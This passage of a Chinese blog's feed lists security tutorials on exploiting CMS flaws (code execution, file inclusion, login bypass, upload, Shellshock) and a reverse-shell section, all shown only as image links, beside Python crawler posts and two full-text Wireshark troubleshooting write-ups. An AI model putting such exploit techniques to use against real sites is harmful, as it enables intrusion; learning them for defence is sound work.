        <content type="html"><![CDATA[<p><img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/1.jpg" alt="1"><br><img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/2.jpg" alt="2"><br><img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/3.jpg" alt="3"><br><img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/4.jpg" alt="4"><br><img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/5.jpg" alt="5"><br><img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/6.jpg" alt="6"><br><img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/7.jpg" alt="7"><br><img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/8.jpg" alt="8"><br><img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/9.jpg" alt="9"><br><img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/10.jpg" alt="10"><br> <img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/11.jpg" alt="11"><br><img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/12.jpg" alt="12"><br><img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/13.jpg" alt="13"><br><img src="/2017/03/28/漏洞实例讲解CMSEasy5.5代码执行漏洞/14.jpg" alt="14">  </p>
]]></content>
        
        <categories>
            
            <category> 信息安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[爬虫正则表达式]]></title>
        <url>https://517736522.github.io/2017/03/28/%E7%88%AC%E8%99%AB%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/爬虫正则表达式/1.jpg" alt="1"><br><img src="/2017/03/28/爬虫正则表达式/2.jpg" alt="2"><br><img src="/2017/03/28/爬虫正则表达式/3.jpg" alt="3"><br><img src="/2017/03/28/爬虫正则表达式/4.jpg" alt="4"><br><img src="/2017/03/28/爬虫正则表达式/5.jpg" alt="5">  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python爬虫 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[百度URL采集]]></title>
        <url>https://517736522.github.io/2017/03/28/%E7%99%BE%E5%BA%A6URL%E9%87%87%E9%9B%86/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/百度URL采集/1.jpg" alt="1"><br><img src="/2017/03/28/百度URL采集/2.jpg" alt="2"><br><img src="/2017/03/28/百度URL采集/3.jpg" alt="3"><br><img src="/2017/03/28/百度URL采集/4.jpg" alt="4"><br><img src="/2017/03/28/百度URL采集/5.jpg" alt="5"><br><img src="/2017/03/28/百度URL采集/6.jpg" alt="6"><br><img src="/2017/03/28/百度URL采集/7.jpg" alt="7"><br><img src="/2017/03/28/百度URL采集/8.jpg" alt="8"><br><img src="/2017/03/28/百度URL采集/9.jpg" alt="9">  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python爬虫 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[漏洞实例讲解远程文件包含漏洞]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
        <content type="html"><![CDATA[<p>##DedeCMS5.7:<br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/1.jpg" alt="1"><br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/2.jpg" alt="2"><br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/3.jpg" alt="3"><br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/4.jpg" alt="4"><br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/5.jpg" alt="5"><br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/6.jpg" alt="6"><br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/7.jpg" alt="7"><br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/8.jpg" alt="8"><br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/9.jpg" alt="9"><br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/10.jpg" alt="10"><br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/11.jpg" alt="11"><br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/12.jpg" alt="12"><br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/13.jpg" alt="13"><br><img src="/2017/03/28/漏洞实例讲解远程文件包含漏洞/14.jpg" alt="14">  </p>
]]></content>
        
        <categories>
            
            <category> 信息安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[爬虫多线程]]></title>
        <url>https://517736522.github.io/2017/03/28/%E7%88%AC%E8%99%AB%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/爬虫多线程/1.jpg" alt="1"><br><img src="/2017/03/28/爬虫多线程/2.jpg" alt="2"><br><img src="/2017/03/28/爬虫多线程/3.jpg" alt="3"><br><img src="/2017/03/28/爬虫多线程/4.jpg" alt="4"><br><img src="/2017/03/28/爬虫多线程/5.jpg" alt="5">  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python爬虫 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[漏洞实例讲解登录绕过漏洞]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</url>
        <content type="html"><![CDATA[<p>##AspCms2.2.9登录绕过漏洞：<br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/1.jpg" alt="1"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/2.jpg" alt="2"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/3.jpg" alt="3"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/4.jpg" alt="4"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/5.jpg" alt="5"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/6.jpg" alt="6"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/7.jpg" alt="7"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/8.jpg" alt="8">  </p>
<p>##AKCMS6.0登录绕过漏洞：<br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/9.jpg" alt="9"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/10.jpg" alt="10"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/11.jpg" alt="11"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/12.jpg" alt="12"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/13.jpg" alt="13"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/14.jpg" alt="14"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/15.jpg" alt="15"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/16.jpg" alt="16"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/17.jpg" alt="17"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/18.jpg" alt="18"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/19.jpg" alt="19"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/20.jpg" alt="20"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/21.jpg" alt="21"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/22.jpg" alt="22"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/23.jpg" alt="23"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/24.jpg" alt="24"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/25.jpg" alt="25"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/26.jpg" alt="26"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/27.jpg" alt="27"><br><img src="/2017/03/28/漏洞实例讲解登录绕过漏洞/28.jpg" alt="28">  </p>
]]></content>
        
        <categories>
            
            <category> 信息安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[漏洞实例讲解文件上传漏洞]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
        <content type="html"><![CDATA[<p>##WEBid1.1.1:<br><img src="/2017/03/28/漏洞实例讲解文件上传漏洞/1.jpg" alt="1"><br><img src="/2017/03/28/漏洞实例讲解文件上传漏洞/2.jpg" alt="2"><br><img src="/2017/03/28/漏洞实例讲解文件上传漏洞/3.jpg" alt="3"><br><img src="/2017/03/28/漏洞实例讲解文件上传漏洞/4.jpg" alt="4"><br><img src="/2017/03/28/漏洞实例讲解文件上传漏洞/5.jpg" alt="5"><br><img src="/2017/03/28/漏洞实例讲解文件上传漏洞/6.jpg" alt="6"><br><img src="/2017/03/28/漏洞实例讲解文件上传漏洞/7.jpg" alt="7"><br><img src="/2017/03/28/漏洞实例讲解文件上传漏洞/8.jpg" alt="8"><br><img src="/2017/03/28/漏洞实例讲解文件上传漏洞/9.jpg" alt="9"><br><img src="/2017/03/28/漏洞实例讲解文件上传漏洞/10.jpg" alt="10">  </p>
<p>##漏洞防护：<br>严格控制上传目录和文件名  </p>
]]></content>
        
        <categories>
            
            <category> 信息安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[代理IP地址采集]]></title>
        <url>https://517736522.github.io/2017/03/28/%E4%BB%A3%E7%90%86IP%E5%9C%B0%E5%9D%80%E9%87%87%E9%9B%86/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/代理IP地址采集/1.jpg" alt="1"><br><img src="/2017/03/28/代理IP地址采集/2.jpg" alt="2"><br><img src="/2017/03/28/代理IP地址采集/3.jpg" alt="3"><br><img src="/2017/03/28/代理IP地址采集/4.jpg" alt="4">  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python爬虫 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[漏洞实例讲解命令执行漏洞]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
        <content type="html"><![CDATA[<p>##Bash4.3:<br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/1.jpg" alt="1"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/2.jpg" alt="2"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/3.jpg" alt="3"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/4.jpg" alt="4"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/5.jpg" alt="5"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/6.jpg" alt="6"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/7.jpg" alt="7"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/8.jpg" alt="8"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/9.jpg" alt="9"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/10.jpg" alt="10"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/11.jpg" alt="11"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/12.jpg" alt="12"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/13.jpg" alt="13"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/14.jpg" alt="14"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/15.jpg" alt="15"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/16.jpg" alt="16"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/17.jpg" alt="17"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/18.jpg" alt="18"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/19.jpg" alt="19"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/20.jpg" alt="20"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/21.jpg" alt="21"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/22.jpg" alt="22"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/23.jpg" alt="23"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/24.jpg" alt="24">  </p>
<p>##PHPCMS2008：<br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/25.jpg" alt="25"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/26.jpg" alt="26"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/27.jpg" alt="27"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/28.jpg" alt="28"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/29.jpg" alt="29"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/30.jpg" alt="30"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/31.jpg" alt="31"><br><img src="/2017/03/28/漏洞实例讲解命令执行漏洞/32.jpg" alt="32">  </p>
]]></content>
        
        <categories>
            
            <category> 信息安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[seebug爬虫实战]]></title>
        <url>https://517736522.github.io/2017/03/28/seebug%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/seebug爬虫实战/1.jpg" alt="1"><br><img src="/2017/03/28/seebug爬虫实战/2.jpg" alt="2"><br><img src="/2017/03/28/seebug爬虫实战/3.jpg" alt="3"><br><img src="/2017/03/28/seebug爬虫实战/4.jpg" alt="4"><br><img src="/2017/03/28/seebug爬虫实战/5.jpg" alt="5"><br><img src="/2017/03/28/seebug爬虫实战/6.jpg" alt="6"><br><img src="/2017/03/28/seebug爬虫实战/7.jpg" alt="7">  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python爬虫 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[zoomeye采集]]></title>
        <url>https://517736522.github.io/2017/03/28/zoomeye%E9%87%87%E9%9B%86/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/zoomeye采集/1.jpg" alt="1"><br><img src="/2017/03/28/zoomeye采集/2.jpg" alt="2"><br><img src="/2017/03/28/zoomeye采集/3.jpg" alt="3"><br><img src="/2017/03/28/zoomeye采集/4.jpg" alt="4"><br><img src="/2017/03/28/zoomeye采集/5.jpg" alt="5"><br><img src="/2017/03/28/zoomeye采集/6.jpg" alt="6"><br><img src="/2017/03/28/zoomeye采集/7.jpg" alt="7"><br><img src="/2017/03/28/zoomeye采集/8.jpg" alt="8">  </p>
<p>##防爬机制突破：</p>
<p><img src="/2017/03/28/zoomeye采集/9.jpg" alt="9"><br><img src="/2017/03/28/zoomeye采集/10.jpg" alt="10">  </p>
<p>##多线程复用：<br><img src="/2017/03/28/zoomeye采集/11.jpg" alt="11"><br><img src="/2017/03/28/zoomeye采集/12.jpg" alt="12">  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python爬虫 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[python网络编程]]></title>
        <url>https://517736522.github.io/2017/03/28/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/python网络编程/1.jpg" alt="1"><br><img src="/2017/03/28/python网络编程/2.jpg" alt="2"><br><img src="/2017/03/28/python网络编程/3.jpg" alt="3"><br><img src="/2017/03/28/python网络编程/4.jpg" alt="4"><br><img src="/2017/03/28/python网络编程/5.jpg" alt="5"><br><img src="/2017/03/28/python网络编程/6.jpg" alt="6"><br><img src="/2017/03/28/python网络编程/7.jpg" alt="7"><br><img src="/2017/03/28/python网络编程/8.jpg" alt="8"><br><img src="/2017/03/28/python网络编程/9.jpg" alt="9"><br><img src="/2017/03/28/python网络编程/10.jpg" alt="10">  </p>
<p>##反弹shell:<br><img src="/2017/03/28/python网络编程/11.jpg" alt="11"><br><img src="/2017/03/28/python网络编程/12.jpg" alt="12">  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python入门 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[python数据库编程]]></title>
        <url>https://517736522.github.io/2017/03/28/python%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/python数据库编程/1.jpg" alt="1"><br><img src="/2017/03/28/python数据库编程/2.jpg" alt="2"><br><img src="/2017/03/28/python数据库编程/3.jpg" alt="3"><br><img src="/2017/03/28/python数据库编程/4.jpg" alt="4"><br><img src="/2017/03/28/python数据库编程/5.jpg" alt="5"><br><img src="/2017/03/28/python数据库编程/6.jpg" alt="6"><br><img src="/2017/03/28/python数据库编程/7.jpg" alt="7"><br><img src="/2017/03/28/python数据库编程/8.jpg" alt="8"><br><img src="/2017/03/28/python数据库编程/9.jpg" alt="9"><br><img src="/2017/03/28/python数据库编程/10.jpg" alt="10"><br><img src="/2017/03/28/python数据库编程/11.jpg" alt="11">  </p>
<p>##爬虫结果保存到数据库：  </p>
<p>###注意：要提交到数据库必须要使用到commit方法<br><img src="/2017/03/28/python数据库编程/12.jpg" alt="12"><br><img src="/2017/03/28/python数据库编程/13.jpg" alt="13"><br><img src="/2017/03/28/python数据库编程/14.jpg" alt="14"><br><img src="/2017/03/28/python数据库编程/15.jpg" alt="15"><br>在Python中利用MySQL connector 连接数据库insert   </p>
<p>测试表明在execute后，insert 的数据已经进入了mysql,但是如果最后没有commit 的话已经进入数据库的数据会被清除掉，自动回滚  </p>
<p>这点是可以通过数据库中的自增id来看出来的。  </p>
<p>###type方法可查看字符编码格式  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python入门 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[Python爬虫hackhttp模块的介绍]]></title>
        <url>https://517736522.github.io/2017/03/28/Python%E7%88%AC%E8%99%ABhackhttp%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BB%8B%E7%BB%8D/</url>
        <content type="html"><![CDATA[<p><img src="Python爬虫hackhttp模块的介绍/1.jpg" alt="1"><br><img src="Python爬虫hackhttp模块的介绍/2.jpg" alt="2"><br><img src="Python爬虫hackhttp模块的介绍/3.jpg" alt="3">  </p>
<p>##结合BeautifulSoup和hackhttp的爬虫实例<br><img src="Python爬虫hackhttp模块的介绍/4.jpg" alt="4"><br><img src="Python爬虫hackhttp模块的介绍/5.jpg" alt="5">  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python爬虫 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[Python爬虫BeautifulSoup模块的介绍]]></title>
        <url>https://517736522.github.io/2017/03/28/Python%E7%88%AC%E8%99%ABBeautifulSoup%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BB%8B%E7%BB%8D/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/Python爬虫BeautifulSoup模块的介绍/1.jpg" alt="1"><br><img src="/2017/03/28/Python爬虫BeautifulSoup模块的介绍/2.jpg" alt="2"><br><img src="/2017/03/28/Python爬虫BeautifulSoup模块的介绍/3.jpg" alt="3"><br><img src="/2017/03/28/Python爬虫BeautifulSoup模块的介绍/4.jpg" alt="4"><br><img src="/2017/03/28/Python爬虫BeautifulSoup模块的介绍/5.jpg" alt="5"><br><img src="/2017/03/28/Python爬虫BeautifulSoup模块的介绍/6.jpg" alt="6"><br><img src="/2017/03/28/Python爬虫BeautifulSoup模块的介绍/7.jpg" alt="7"><br><img src="/2017/03/28/Python爬虫BeautifulSoup模块的介绍/8.jpg" alt="8"><br>这就是beautifulsoup的好处–正确匹配出我们想要的结果  </p>
]]></content>
        
        <categories>
            
            <category> python开发 </category>
            
            <category> python爬虫 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[问题有时出在对方身上]]></title>
        <url>https://517736522.github.io/2017/03/28/%E9%97%AE%E9%A2%98%E6%9C%89%E6%97%B6%E5%87%BA%E5%9C%A8%E5%AF%B9%E6%96%B9%E8%BA%AB%E4%B8%8A/</url>
        <content type="html"><![CDATA[<p>##网络情景概述<br>我们这次的网络情景与前两个情景基本是一样的。这次，有一位用户抱怨他的工作站不能够上网，后来发现，其实只是不能够访问[<a href="http://www.google.com/]这个网站。进一步的研究分析之后，发现这个问题在该机构中每个人身上都存在，也就是所有的计算机都不能访问Google了。这个环境的网络配置和前两个场景是一样的，仍然是使用一些简单的交换机和一个路由器将网络连接到Internet。" target="_blank" rel="external">http://www.google.com/]这个网站。进一步的研究分析之后，发现这个问题在该机构中每个人身上都存在，也就是所有的计算机都不能访问Google了。这个环境的网络配置和前两个场景是一样的，仍然是使用一些简单的交换机和一个路由器将网络连接到Internet。</a></p>
<p>那么为了解决这个问题，我们需要访问[<a href="http://www.google.com]这个网站来生成必要的数据包。由于所有人都访问不了Google，说明这是一个全网的问题，影响着每一个人的计算机，而且很可能是感染了恶意程序导致的。正因为如此，就不应该直接在该网络环境中的设备上进行嗅探。当我们在现实中遇到类似这样的问题时，使用网络分流器是最好的解决方案，因为它允许我们在短暂中断服务后完全被动地获取流量。通过网络分流器获得的捕获文件就是Lab27-1.pcap。" target="_blank" rel="external">http://www.google.com]这个网站来生成必要的数据包。由于所有人都访问不了Google，说明这是一个全网的问题，影响着每一个人的计算机，而且很可能是感染了恶意程序导致的。正因为如此，就不应该直接在该网络环境中的设备上进行嗅探。当我们在现实中遇到类似这样的问题时，使用网络分流器是最好的解决方案，因为它允许我们在短暂中断服务后完全被动地获取流量。通过网络分流器获得的捕获文件就是Lab27-1.pcap。</a>  </p>
<p>##数据包分析<br>这个数据包一开始所捕获到的是DNS数据包，而不是我们之前看到的ARP数据包：<br><img src="/2017/03/28/问题有时出在对方身上/1.jpg" alt="1"><br>因为这里所捕获到的第一个数据包发往一个外部地址，并且2号数据包包含了来自那个地址的响应，于是我们就可以假设ARP的过程已经是完成了，并且网关路由器的MAC-IP地址映射已经存在于主机的ARP缓存中。</p>
<p>如上图所示，捕获文件中的第一个数据包是从主机172.16.0.8发往地址4.2.2.1，并且它是一个DNS数据包。通过查看数据包的内容，可以知道这是一个查询www.google.com的A记录的请求。接下来我们看一下2号数据包：<br><img src="/2017/03/28/问题有时出在对方身上/2.jpg" alt="2"><br>第2个数据包是来自4.2.2.1的响应。查看Packet Details面板，我们发现响应这个请求的名称服务器提供了多个应答，此时看起来并没有什么问题。</p>
<p>现在用户计算机已经得到了Web服务器的IP地址，它可以尝试与服务器进行通信了。通信的过程是3号数据包开始的，如下图所示：<br><img src="/2017/03/28/问题有时出在对方身上/3.jpg" alt="3"><br>这个数据包是一个从172.16.0.8发往74.125.95.105的TCP数据包。这个目标地址来源于数据包2里面DNS查询响应提供的第1个A记录。TCP数据包设置了SYN标志，并尝试连接远程服务器的80端口。</p>
<p>因为这是一个TCP握手的过程，我们知道应当在响应中看到TCP SYN/ACK数据包，但是相反，主机过了一会又发了另一个SYN数据包到对方主机。并且在过了大约1秒后，主机又发送了一个SYN的数据包。之后通信就停止了，于是网页浏览器就报告找不到网站。</p>
<p>此时，我们想到由于能够成功向外部DNS服务器提交查询请求，所以网络内的工作站可以连接到外网。DNS服务器响应了一些看起来有效的IP地址，然后我们的主机就尝试向其中的一个地址建立连接。而且我们尝试连接的本地工作站看起来功能也很正常。</p>
<p>现在的问题是，远程服务器并没有响应我们的连接请求，连TCP RST这样的数据包都没有发过来。这种情况的原因有以下几种： 1、Web服务器配置错误 2、Web服务器的协议栈崩溃 3、远程网络部署了诸如防火墙这样的数据包过滤设备</p>
<p>假设本地网络没有数据包过滤设备，那所有的可能解决方法都在远程的网络上，这就超出了我们的控制范围。在这个案例中，Web服务器工作不正常，导致我们所有的尝试都失败了。那么一旦对方网站修复了故障，通信就可以继续了。  </p>
<p>##总结<br>这次我们所遇到的问题并不是我们能够解决的，经过Wireshark的抓包分析可以知道问题并不出自我们网络上的主机、路由器，也不在于提供域名解析服务的外部DNS服务器。问题就在于我们的设施之外。</p>
<p>事实上，在实际的网络排错过程中，发现网络故障是对方的问题而不是我们的问题，有助于缓解我们的压力。而且如果对方狡辩说这并不是他们的问题，我们就可以有充分的证据来证明我们的观点，毕竟网络数据包是不会说谎的。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 排错篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[让Wireshark帮我们揪出意外的重定向]]></title>
        <url>https://517736522.github.io/2017/03/28/%E8%AE%A9Wireshark%E5%B8%AE%E6%88%91%E4%BB%AC%E6%8F%AA%E5%87%BA%E6%84%8F%E5%A4%96%E7%9A%84%E9%87%8D%E5%AE%9A%E5%90%91/</url>
        <content type="html"><![CDATA[<p>##网络情景概述<br>这次我们所要研究的网络情景，也是一位不能够在工作站上网的用户。然而，与上一位用户所不同的是，这个用户可以访问Internet，但是却不能够访问Google的主页<a href="http://www.google.com/。这个用户每次想访问Google的时候，都会被重定向到一个浏览器页面“无法显示此网页”，如下图所示：" target="_blank" rel="external">http://www.google.com/。这个用户每次想访问Google的时候，都会被重定向到一个浏览器页面“无法显示此网页”，如下图所示：</a><br><img src="/2017/03/28/让Wireshark帮我们揪出意外的重定向/1.jpg" alt="1"><br>并且这个问题只影响该用户一个人，也就是只有他自己的计算机有这种问题。与之前的网络环境一样，这是一个只有一些简单交换机和一个简单路由器网关的小型网络环境。那么我们依旧可以利用网络分流器，一边监听流量，一边让用户尝试浏览<a href="http://www.google.com/，从而捕获到了实验文件Lab26-1.pcap。" target="_blank" rel="external">http://www.google.com/，从而捕获到了实验文件Lab26-1.pcap。</a>  </p>
<p>##数据包分析<br>可以看到，实验文件是以ARP的请求和响应开始的：<br><img src="/2017/03/28/让Wireshark帮我们揪出意外的重定向/2.jpg" alt="2"><br>在1号数据包里面，用户计算机的MAC地址是00:25:b3:bf:91:ee，IP地址是172.16.0.8，它向网段上的所有计算机发送一个ARP广播数据包，试图获取主机172.16.0.102的MAC地址，这是我们目前还不知道的一个地址。</p>
<p>在数据包2中，用户的计算机了解到IP地址172.16.0.102的MAC地址是00:21:70:c0:56:f0。根据上一次的课程，我们也许会猜测这是网关路由器的地址。通过这个地址，数据包就可以被再次转发到外部DNS服务器。但是下一个数据包并不是DNS请求，而是从172.16.0.8到172.16.0.102的TCP数据包。并且它还设置了SYN标志，表示这是两台主机之间建立TCP三次握手时的第一个数据包。</p>
<p>显然，试图连接到172.16.0.102的80端口的TCP连接通常与HTTP的流量相关。如下图所示：<br><img src="/2017/03/28/让Wireshark帮我们揪出意外的重定向/3.jpg" alt="3"><br>当主机172.16.0.102发回带有RST和ACK标志的TCP数据包之后，连接就中断了。我们在TCP的课程中讲过，带有RST标志的数据包是用来结束TCP连接的。在这个实验场景中，主机172.16.0.8尝试与主机172.16.0.102的80端口建立TCP连接。但是目标主机并没有配置好在80端口监听请求的服务，于是只能够发送TCP的RST数据包来结束连接。可以看到接下来这个过程又重复了两次。最后，用户就在网页浏览器上看到了“无法显示此网页”的提示。</p>
<p>在查看了其它工作正常的网络设备的配置信息后，1号和2号数据包中的ARP请求和响应引起了我们的注意。因为ARP请求并不是指向网关路由器的真实MAC地址，而是其它未知设备。在ARP请求和响应之后，我们期望看到发送给DNS服务器的请求，以得到www.google.com的IP地址，但事实上我们并没有看到。阻止DNS查询常见有两个条件：</p>
<p>1、发起连接的设备在DNS缓存中已经有域名到IP地址的映射。 2、发起连接的设备在hosts文件中已经有域名到IP地址的映射。</p>
<p>那么依据上述两点，进一步检查这个计算机之后，我们发现它的hosts文件中有一个www.google.com表项，对应一个内网IP地址172.16.0.102。而这个错误的表项就是用户问题的根源。</p>
<p>这里我们可以举一个例子，在Windows系统中，我们打开C:\Windows\System32\drivers\ect，其中有一个hosts文件。我们可以在其中加入一个新的条目：</p>
<p>127.0.0.1 www.ichunqiu.com 那么此时我们尝试用浏览器访问“i春秋”的网站，就会发现已经打不开了。其实这个原理与该用户的情况是一样的。计算机通常都把hosts文件当作域名-IP地址配对的可信来源，并且会在查询外部来源之前检索它。在这个场景中，用户计算机检查它的hosts文件，发现有一个www.google.com的表项，就认为www.google.com在本地的网段中。接着，它向这个主机发送ARP请求，并得到了响应，然后尝试向172.16.0.102的80端口发起TCP连接。然而，由于该系统并没有配置为Web服务器，所以它不可能接受这个连接请求。那么只要将hosts文件中的表项移除，就可以正常访问www.google.com了。</p>
